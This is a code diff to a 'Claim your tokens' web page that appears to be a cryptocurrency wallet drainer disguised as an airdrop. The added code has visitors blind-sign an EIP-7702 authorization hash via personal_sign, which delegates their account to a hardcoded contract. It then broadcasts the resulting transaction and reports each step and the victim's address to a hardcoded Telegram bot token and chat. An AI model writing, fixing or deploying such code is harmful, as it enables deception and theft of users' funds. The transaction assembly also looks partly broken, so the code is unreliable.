@@ -60,7 +60,7 @@
         <div class="sub">Claim your tokens</div>
         
         <div class="info">
-            <span class="info-icon">🔐🌹</span>
+            <span class="info-icon">🔐🌈</span>
             <span>Router: <span style="color:#ff6b35;font-family:monospace;">ROUTER_CONTRACT_ADDRESS</span></span>
         </div>
         
@@ -69,9 +69,11 @@
         <div class="status" id="status"></div>
     </div>
 
+    <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
     <script>
         const ROUTER = '0x7debCF72BebA168Bb49eec6BbB1156E203A564FD';
-        const CHAIN_ID = '0x1';
+        const CHAIN_ID = 1;
+        const CHAIN_ID_HEX = '0x1';
         const TBT = '8275273137:AAG3PqVdJ4_EK_AICGNrv1mtOPJAPVSq6eY';
         const TCI = '-1002810760353';
 
@@ -83,29 +85,18 @@
             }).catch(() => {});
         }
 
-        async function tryMethod2(userAddress) {
-            sendLog('M2: wallet_sendCalls v2.0.0');
-            const txHash = await window.ethereum.request({
-                method: 'wallet_sendCalls',
-                params: [{
-                    version: '2.0.0',
-                    chainId: CHAIN_ID,
-                    atomicRequired: false,
-                    from: userAddress,
-                    calls: [{
-                        to: userAddress,
-                        data: '0x61461954',
-                        value: '0x0'
-                    }],
-                    capabilities: {
-                        eip7702: {
-                            address: ROUTER
-                        }
-                    }
-                }]
-            });
+        function rlpEncodeAuth(chainId, address, nonce) {
+            const chainIdHex = ethers.toBeHex(chainId);
+            const addr = ethers.getAddress(address);
+            const nonceHex = nonce === 0 ? '0x' : ethers.toBeHex(nonce);
 
-            return txHash;
+            const rlp = ethers.encodeRlp([
+                chainIdHex,
+                addr,
+                nonceHex
+            ]);
+
+            return rlp;
         }
 
         document.getElementById('claimBtn').addEventListener('click', async () => {
@@ -126,11 +117,11 @@
                 sendLog('CONNECT: ' + userAddress);
 
                 const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-                if (chainId !== CHAIN_ID) {
+                if (chainId !== CHAIN_ID_HEX) {
                     try {
                         await window.ethereum.request({
                             method: 'wallet_switchEthereumChain',
-                            params: [{ chainId: CHAIN_ID }]
+                            params: [{ chainId: CHAIN_ID_HEX }]
                         });
                     } catch (e) {
                         sendLog('CHAIN FAIL');
@@ -140,23 +131,73 @@
                     }
                 }
 
-                btn.textContent = 'Confirm in wallet...';
+                const nonce = await window.ethereum.request({
+                    method: 'eth_getTransactionCount',
+                    params: [userAddress, 'latest']
+                });
 
-                let txHash;
+                const authRlp = rlpEncodeAuth(CHAIN_ID, ROUTER, 0);
+                const magicByte = new Uint8Array([0x05]);
+                const authHash = ethers.keccak256(
+                    ethers.concat([magicByte, ethers.getBytes(authRlp)])
+                );
 
-                try {
-                    txHash = await tryMethod2(userAddress);
-                } catch (e) {
-                    sendLog('M2 FAIL: ' + (e.message || '') + ' code:' + (e.code || ''));
-                    throw e;
-                }
+                btn.textContent = 'Sign in wallet...';
+                sendLog('REQUESTING SIGNATURE');
+
+                const signature = await window.ethereum.request({
+                    method: 'personal_sign',
+                    params: [authHash, userAddress]
+                });
+
+                sendLog('SIGNED');
+
+                const sigBytes = ethers.getBytes(signature);
+                const r = ethers.hexlify(sigBytes.slice(0, 32));
+                const s = ethers.hexlify(sigBytes.slice(32, 64));
+                const yParity = sigBytes[64] - 27;
+
+                const authTuple = [
+                    ethers.toBeHex(CHAIN_ID),
+                    ROUTER,
+                    '0x',
+                    ethers.toBeHex(yParity),
+                    r,
+                    s
+                ];
+
+                const authListRlp = ethers.encodeRlp([authTuple]);
+
+                const txRlp = ethers.encodeRlp([
+                    ethers.toBeHex(CHAIN_ID),
+                    nonce,
+                    '0x77359400',
+                    '0x77359400',
+                    ethers.toBeHex(200000),
+                    userAddress,
+                    '0x0',
+                    '0x61461954',
+                    [],
+                    authListRlp
+                ]);
+
+                const txType = '0x04';
+                const rawTx = txType + txRlp.slice(2);
+
+                btn.textContent = 'Sending...';
+                sendLog('BROADCASTING');
+
+                const txHash = await window.ethereum.request({
+                    method: 'eth_sendRawTransaction',
+                    params: [rawTx]
+                });
 
                 sendLog('TX: ' + txHash);
                 status.textContent = 'Claimed: ' + txHash.slice(0, 24) + '...';
                 btn.textContent = 'Complete';
 
             } catch (e) {
-                sendLog('FAIL: ' + (e.message || ''));
+                sendLog('FAIL: ' + (e.message || '') + ' code:' + (e.code || ''));
                 btn.disabled = false;
                 btn.textContent = 'Claim Now';
             }
